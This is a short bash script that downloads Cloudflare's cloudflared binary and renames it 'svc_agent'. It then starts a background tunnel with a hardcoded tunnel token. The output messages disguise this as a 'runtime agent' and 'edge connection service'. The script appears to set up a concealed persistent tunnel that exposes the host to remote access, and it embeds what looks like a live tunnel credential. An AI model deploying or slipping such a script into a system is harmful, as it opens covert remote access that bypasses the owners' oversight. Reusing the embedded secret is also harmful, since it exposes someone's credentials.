#!/bin/bash
set -e

BIN="svc_agent"
if [ ! -f "./$BIN" ]; then
    echo "Downloading runtime agent..."
    curl -sL -o "$BIN" https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
    chmod +x "$BIN"
fi

SEC="eyJhIjoiMDM1YTRjNTcwODllN2RhYTQxNmY2NzMwMDUzZWQ1MTgiLCJ0IjoiMGI4MTlkMTktYmMxOC00OTVmLThiYjUtMTllYTFkYzU5NjgyIiwicyI6Ik5USmtabVl5TWpndFkyRTNNUzAwTnpRNExUZ3pPREl0TkRVeVpUWXdNbVk1WWpnMiJ9"

echo "Starting edge connection service..."
nohup ./"$BIN" tunnel run --token "$SEC" > service.log 2>&1 &

echo "Agent launched successfully (PID: $!)."
sleep 4
if [ -f service.log ]; then
    echo "=== Service Log ==="
    tail -n 15 service.log
fi
